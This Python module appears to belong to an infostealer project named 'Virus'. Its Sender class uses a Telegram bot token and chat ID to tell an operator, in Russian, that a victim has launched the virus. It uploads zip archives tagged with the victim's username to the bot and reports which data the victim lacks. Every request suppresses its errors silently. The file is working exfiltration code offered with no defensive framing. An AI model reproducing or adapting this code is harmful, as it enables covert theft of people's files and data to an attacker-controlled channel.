from requests import Session
from Virus.config import TOKEN, CHAT_ID
from Virus.Helpers.Support import current_user


session = Session()
session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'

url_Document = f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}'
url_text = lambda text: f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}'


message_to_send = ''


class Sender:
    @staticmethod
    def start():
        try:
            session.post(url_text(f'{current_user} запустил вирус, ожидаем...'))
        except:
            pass

    @staticmethod
    def send_data(data, name):
        try:
            session.post(url_Document, files={"document": (f'{name}({current_user}).zip', data)})
        except:
            pass


    @staticmethod
    def send_error(name):
        try:
            session.post(url_text('Пользователь: ' + current_user + f' не имеет {name}'))
        except:
            pass

    @staticmethod
    def end_post():
        try:
            session.post(message_to_send)
        except:
            pass


if __name__ == '__main__':
    Sender.start()

